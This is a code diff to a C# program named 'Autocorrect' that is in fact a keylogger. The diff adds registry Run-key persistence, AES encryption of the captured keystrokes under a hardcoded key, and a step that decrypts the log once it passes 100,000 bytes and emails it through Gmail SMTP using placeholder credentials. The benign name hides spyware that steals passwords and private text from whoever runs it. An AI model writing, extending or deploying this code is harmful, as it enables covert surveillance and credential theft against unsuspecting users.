@@ -1,4 +1,4 @@
-﻿using Microsoft.Win32;
+using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -10,11 +10,15 @@ using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using System.Threading;
 using System.Diagnostics;
+using System.Security.Cryptography;
+using System.Net;
+using System.Net.Mail;
 
 namespace Autocorrect
 {
 	class Program
 	{
+        // key presses
 		[Flags]
 		private enum KeyStates
 		{
@@ -52,7 +56,55 @@ namespace Autocorrect
 		{
 			return KeyStates.Toggled == (GetKeyState(key) & KeyStates.Toggled);
 		}
-		static private void SetStartup()
+        //
+        private static byte[] key = Encoding.ASCII.GetBytes("1njanrhdkCnsahrebfdMvbjo32hqnd31");
+        private static byte[] vec = Encoding.ASCII.GetBytes("jsKidmshatyb4jdu");
+        public static string CryptAES(string textToCrypt)
+        {
+            try
+            {
+                using (var rijndaelManaged =
+                       new RijndaelManaged { Key = key, IV = vec, Mode = CipherMode.CBC })
+                using (var memoryStream = new MemoryStream())
+                using (var cryptoStream =
+                       new CryptoStream(memoryStream,
+                           rijndaelManaged.CreateEncryptor(key, vec),
+                           CryptoStreamMode.Write))
+                {
+                    using (var ws = new StreamWriter(cryptoStream))
+                    {
+                        ws.Write(textToCrypt);
+                    }
+                    return Convert.ToBase64String(memoryStream.ToArray());
+                }
+            }
+            catch (CryptographicException e)
+            {
+                return null;
+            }
+        }
+        public static string DecryptAES(string cipherData)
+        {
+            try
+            {
+                using (var rijndaelManaged =
+                       new RijndaelManaged { Key = key, IV = vec, Mode = CipherMode.CBC })
+                using (var memoryStream =
+                       new MemoryStream(Convert.FromBase64String(cipherData)))
+                using (var cryptoStream =
+                       new CryptoStream(memoryStream,
+                           rijndaelManaged.CreateDecryptor(key, vec),
+                           CryptoStreamMode.Read))
+                {
+                    return new StreamReader(cryptoStream).ReadToEnd();
+                }
+            }
+            catch (CryptographicException e)
+            {
+                return null;
+            }
+        }
+        static private void SetStartup()
 		{
 			RegistryKey rk = Registry.CurrentUser.OpenSubKey
 				("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
@@ -68,20 +120,13 @@ namespace Autocorrect
 
             if (File.Exists(@"C:\usmen.sql"))
             {
-                ProcessStartInfo p = new ProcessStartInfo();
-                for (int i = 0; i < args.Length; i++)
-                {
-                   p.Arguments = args[i];
-                }
-                p.FileName =@"C:\usmen.exe";
-                Process.Start(p);
-                //add to startup SetStartup();
-                File.Create("Log.txt").Close();
+                SetStartup();
                 while (true)
                 {
                     if (true)
                     {
-                        if (IsKeyDown(Keys.A))
+						#region keys
+						if (IsKeyDown(Keys.A))
                         {
                             Log += "a";
                             Thread.Sleep(100);
@@ -234,20 +279,41 @@ namespace Autocorrect
                             Log += " ";
                             Thread.Sleep(100);
                         }
-                    }
+						#endregion
+					}
+                    if(Log != "")
+					{
+                        File.AppendAllText("Log.txt", CryptAES(Log) + " ");
+
                         FileInfo fi = new FileInfo("Log.txt");
                         long size = fi.Length;
                         if (size > 100000)
-						{
-                            //send off to somewhere or do something with data
+                        {
+                            Console.WriteLine(File.ReadAllText("Log.txt").Split(' ').Length);
+                            for (int i = 0; i < File.ReadAllText("Log.txt").Split(' ').Length; i++)
+                            {
+                                //DECRTYPTION
+                                Console.Write(DecryptAES(File.ReadAllText("Log.txt").Split(' ')[i]));
+                                File.AppendAllText("Cleaned.txt", DecryptAES(File.ReadAllText("Log.txt").Split(' ')[i]));
 
-                            //
-                            File.Delete("Log.txt");
-                            File.Create("Log.txt").Close();
+                            }
+                            
+                            var client = new SmtpClient("smtp.gmail.com", 587)
+                            {
+                                Credentials = new NetworkCredential("EMAIL", "Password"),
+                                EnableSsl = true
+                            };
+                            client.Send("EMAIL", "EMAIL", "Data From Logger", File.ReadAllText("Cleaned.txt"));
+
+                            File.Delete("Cleaned.txt");
+
+                            File.Delete("Log.txt"); File.Create("Log.txt").Close();
                         }
-                        File.AppendAllText("Log.txt", Log);
+
                         Log = "";
                         i = 0;
+                    }
+
                 }
             }
             else
